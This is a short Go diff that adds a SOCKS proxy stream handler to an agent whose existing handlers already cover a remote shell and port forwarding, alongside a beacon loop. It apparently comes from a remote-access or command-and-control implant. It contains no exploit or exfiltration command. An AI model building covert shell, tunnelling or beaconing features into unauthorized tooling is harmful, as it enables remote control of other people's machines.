@@ -187,6 +187,7 @@ func (a *Agent) Start() error {
 
 	a.node.SetStreamHandler(transport.ShellProtocolID, a.handleShellStream)
 	a.node.SetStreamHandler(transport.PortfwdProtocolID, a.handlePortfwdStream)
+	a.node.SetStreamHandler(transport.SocksProtocolID, a.handleSocksStream)
 
 	a.wg.Add(1)
 	go a.beaconLoop()
